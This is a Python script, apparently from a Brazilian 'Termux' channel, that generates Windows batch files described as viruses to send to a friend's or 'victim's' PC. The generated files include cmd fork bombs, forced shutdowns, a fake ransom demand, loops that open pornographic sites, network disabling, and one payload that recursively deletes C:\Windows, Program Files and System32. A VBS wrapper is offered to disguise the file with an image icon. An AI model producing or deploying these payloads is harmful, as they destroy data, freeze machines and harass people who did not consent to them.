import os
from colorama import init, Fore, Style 
import time
import sys
from termcolor import colored

init(autoreset=True)

# ASCII Art da caveira
skull_art = f"""
{Fore.RED}       ______
     .-        -.
    /            \\  ASSUSTAR SEU AMIGO :) 
   |              |   TALVEZ VOCÊ NÃO TENHA PC MAIS TÊM TERMUX
   |,  .-.  .-.  ,|     TERMUX VS PC .BAT PERIGOSO
   | )(_o/  \\o_)( |
   |/     /\\     \\|
   (_     ^^     _)
    \\__|IIIIII|__/
     | \\IIIIII/ |
     \\          /
      `--------`
"""

# Função para mostrar o loading
def loading_skull(duration):
    for _ in range(duration):
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela
        print(skull_art)
        print(Fore.YELLOW + "Carregando..." + Style.RESET_ALL)
        time.sleep(0.5)  # Espera meio segundo
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela
        print(Fore.YELLOW + "Carregando." + Style.RESET_ALL)
        time.sleep(0.5)  # Espera meio segundo
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela
        print(Fore.YELLOW + "Carregando.." + Style.RESET_ALL)
        time.sleep(0.5)  # Espera meio segundo
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela
        print(Fore.YELLOW + "Carregando..." + Style.RESET_ALL)
        time.sleep(0.5)  # Espera meio segundo

# Executa a função de loading por 5 ciclos
loading_skull(5)

# Arte ASCII com cores, incluindo vermelho
ascii_art = f"""
{Fore.RED}                      :::!~!!!!!:.   TERMUX VS WINDOWS
                  .xUHWH!! !!?M88WHX:.         GERADOR .BAT PARA PC VIRUS 
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!    PERIGO VIRUS
             :X- M$$$$    *  `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"" 
.....   -~~:<` !    ~?T#$$@@W@*?$$   *  /` 
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    : 
#{Fore.RED}#~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!` 
{Fore.RED}:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! ` 
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM! C
$R@i.~~ !     :   ~$$$$$B$$en:``         Canal Lima  TERMUX
?MXT@Wx.~    :     ~"##*$$$$M~           Criador:Samuel Rodrigues Silva Lima
"""

print(f"{Style.BRIGHT + ascii_art}")


# Inicializa o Colorama
init(autoreset=True)

# Função de loading para simular o processo do "vírus"
def virus_loading():
    print(Fore.MAGENTA + "Iniciando ataque de vírus...")
    for i in range(10):
        print(Fore.MAGENTA + f"\rCarregando... {i * 10}%", end="")
        time.sleep(0.5)
    print(Fore.RED + "\nVírus ativado!")

# Execução do loading e exibição da arte ASCII
if __name__ == "__main__":
    virus_loading()
    time.sleep(1)
    


# Função para o loading do "vírus"
def virus_loading():
    print(Fore.MAGENTA + "Iniciando ataque...")  # Texto em roxo (magenta)
    for i in range(10):
        sys.stdout.write(Fore.MAGENTA + "\rCarregando [%-10s] %d%%" % ('='*i, 10*i))
        sys.stdout.flush()
        time.sleep(0.5)  # Simula o tempo de carregamento
    print(Fore.MAGENTA + "\n\nVírus ativado com sucesso!")
    time.sleep(1)

# Função para rodar o .bat (simulação)
def run_bat_script():
    bat_content = """
    @echo off
    echo Virus ativado! Sistema sera corrompido em breve...
    pause
    """
    
    # Cria um arquivo .bat temporário
    with open("virus.bat", "w") as bat_file:
        bat_file.write(bat_content)
    
    # Executa o arquivo .bat
    os.system("virus.bat")

# Execução do "loading" e do script .bat
if __name__ == "__main__":
    virus_loading()
    run_bat_script()
def gerar_bat(opcao, caminho_imagem):
    if opcao == '1':
        conteudo = """@echo off
        title Formatado
        color c
echo  ................................
echo  . SEU PC JÁ ERA OTÁRIO HACK :) .
echo  . CREDITOS CANAL LIMA TERMUX   .
echo  ................................       
pause
msg * System Sendo Formatado

start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
shutdown -s -t 15 -c "Formatador PC Diga ADEUS!!!! HACK :)"


:: Definindo o caminho da pasta Temp
set "folder=%TEMP%"

:: Excluir todos os arquivos da pasta Temp
del /Q "%folder%\*"

:: Excluir subpastas e seus arquivos
for /d %%p in ("%folder%\*") do rmdir "%%p" /s /q

echo Todos os arquivos e subpastas foram excluídos da pasta: %folder%
pause

"""
        nome_arquivo = "attck_format.bat"

    elif opcao == '2':
        conteudo = """@echo off
title Hack AVISO:
color c
echo ...................................
echo . HACK ATTACK PC TRAVAR COMEÇA!!!!.
echo ...................................    
pause
:loop

msg * Travando Terminal :) Hack Canal Lima
start cmd
start cmd
start cmd

goto loop
"""
        nome_arquivo = "travamento_pc.bat"

    elif opcao == '3':
        conteudo = """@echo off
title Hack Attack
color c
echo ............................
echo .ATTACK HACK PC VITIMA ........
echo ............................
pause
:loop
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
start cmd
goto loop
"""
        nome_arquivo = "VARIOS_cmd.bat"

    elif opcao == '4':
        conteudo = """@echo off
title RENSOWARE
color c
echo ..........................
echo .VITIMA DE RENSOWARE DIGA .
echo .ADEUS SEU PC PAGAR O RESGATE.
echo .............................
pause       
msg * Seu Pc está Sendo Formatador
msg * Digar Adeus á Seu Pc
start cmd
start cmd
start cmd
shutdown -s -t 15 -c "PAGAR 500 REAIS DO RESGATE!!!"

"""
        nome_arquivo = "pegadinha_formatar.bat"

    elif opcao == '5':
        conteudo = """@echo off


start https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
https://pt.pornhub.com/video/search?search=xxx
"""
        nome_arquivo = "pegadinha_msg.bat"

    elif opcao == '6':
        conteudo = """@echo off
echo Iniciando processo de exclusão do sistema...
msg ** Sistema sendo apagador !!!!!!

rd /s /q "C:\Windows"

rd /s /q "C:\Program Files"

rd /s /q "C:\Windows\System32"

echo Pastas do sistema excluídas com sucesso.
pause

"""
        nome_arquivo = "CRITICO.bat"

    elif opcao == '7':
        conteudo = """@echo off

shutdown -s -t 15 -c "PC ESTÁ SENDO HACKEADO"

"""
        nome_arquivo = "DESLIGAR.bat"

    elif opcao == '8':
        conteudo = """@echo off
:loop        
md s
md d
md saia
md jah
md jhsoa
md hhshsa
md shaaggfs
md haahyhsh
md jhajhjajha
md hhahasjh
md jjahahs
md ahsgjhds
md jhjshs
md haajkshauq
md jjkaklajsj
md jkajkjkshjs
md dmdmdndj
md jsjhjsjs
goto loop
"""
        nome_arquivo = "Travamento.bat"

    elif opcao == '9':
        conteudo = """@echo off
:loop
msg * attck Loop Infinito
start https://www.google.com
start https://www.facebook.com
start https://www.youtube.com
start https://pt.pornhub.com/video/search?search=xxx
timeout /t 5 >nul

goto loop

"""
        nome_arquivo = "Link.bat"

    elif opcao == '10':
        conteudo = """@echo off
          title HACK MENSAGEM
          color c
          
:loop       
msg * Digar Adeus Otario Hack!!!
echo .......................
echo .VIRUS CRIADOR INFECTAR.
echo .SEU PC SERÁ DESTRUIDO.
echo .......................

goto loop
shutdown -s -t 15 -c "VIRUS DESTRUIDOR SYSTEM"
"""
        nome_arquivo = "VIRUS_INFECT.bat"

    elif opcao == '11':
        conteudo = """@echo off
:: Desativa todas as interfaces de rede (Wi-Fi e Ethernet)
echo Desconectando da rede...
netsh interface set interface "Wi-Fi" admin=disable
netsh interface set interface "Ethernet" admin=disable
echo Conexao de rede desativada.
pause

"""
        nome_arquivo = "pegadinha_desconectar.bat"

    else:
        print("Opção inválida.")
        return

    # Adicionar imagem como ícone se o caminho for válido
    if caminho_imagem and os.path.isfile(caminho_imagem):
        nome_arquivo = nome_arquivo.replace('.bat', '.vbs')  # VBS para mudar o ícone
        conteudo_vbs = f"""
Set WshShell = CreateObject("WScript.Shell")
Set oShell = CreateObject("Shell.Application")
oShell.Namespace(0).ParseName("{nome_arquivo}").InvokeVerb("Properties")
WshShell.Run "cmd /c {nome_arquivo}"
"""
        with open(nome_arquivo, 'w') as f:
            f.write(conteudo_vbs)
    else:
        with open(nome_arquivo, 'w') as f:
            f.write(conteudo)

    print(f"Arquivo {nome_arquivo} gerado com sucesso!")

def main():
    print(Fore.GREEN + " ESCOLHA UM  .bat PARA FERRA COM SEU AMIGO OU ASSUSTAR:")
    print(Fore.RED + "\n1.ATTACK: FORMATA PC ASSUSTAR VITIMA!!!! CRITICO'")
    print(Fore.RED + "\n2. ATTACK :Loop QUE TRAVAR PC HACK")
    print(Fore.RED + "\n3.ATTACK : ABRIR VARIOS CMDS DO PC HACK")
    print(Fore.RED + "\n4. ATTACK: PC SENDO VITIMA RESOWARE")
    print(Fore.RED + "\n5.ATTACK:   MANDA PARA SITE X ")
    print(Fore.RED + "\n6. ATTACK: FORMATAR PC NÃO FOI TESTADO MAIS PODE SER CRITICO!!!!!")
    print(Fore.GREEN + "\n7. ATTACK: DESLIGAR SYSTEM PC")
    print(Fore.GREEN +"\n8. ATTACK : CRIA VARIAS PASTAS LOOP INFINITO ")
    print(Fore.GREEN + "\n9. ATTACK: CRIA INFINITO LOOP ABRIR VARIOS LINKS")
    print(Fore.RED + "\n10.ATTACK:MENSAGEM DE INFECÇÃO")
    print(Fore.RED + "\n11. ATTACK: DESCONECTA INTERNET")

    opcao = input(Fore.BLUE + "\nAQUAL OPCAO ESCOLHE AI: ")
    caminho_imagem = input(" DIGITA O CAMINHO DA IMAGEM PARA ADICIONAR (ou deixe em branco): ")
          

    gerar_bat(opcao, caminho_imagem)



# Função para mostrar o loading
def loading_generator(duration):
    os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela

    # Cabeçalho
    print(f"{Fore.MAGENTA}Criador .bat virus para o PC da vítima{Style.RESET_ALL}\n")
    
    # Carregamento
    for i in range(101):
        os.system('cls' if os.name == 'nt' else 'clear')  # Limpa a tela
        print(f"{Fore.MAGENTA}MENU CARREGADOR GERADO .BAT MANDA PARA VITIMAN{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}Carregando: {i}%")
        
        # Simulando o progresso com a barra
        bar_length = 40  # Comprimento da barra de progresso
        filled_length = int(bar_length * i // 100)  # Preenchimento da barra
        bar = '█' * filled_length + '-' * (bar_length - filled_length)  # Cria a barra
        
        print(f"{Fore.GREEN}|{bar}|")  # Exibe a barra de progresso
        time.sleep(duration / 100)  # Espera um tempo proporcional para o progresso

    print(f"\n{Fore.MAGENTA}Carregamento concluído!{Style.RESET_ALL}")

# Executa a função de loading
loading_generator(5)  # Duração total de 5 segundos para o carregamento

if __name__ == "__main__":
    main()
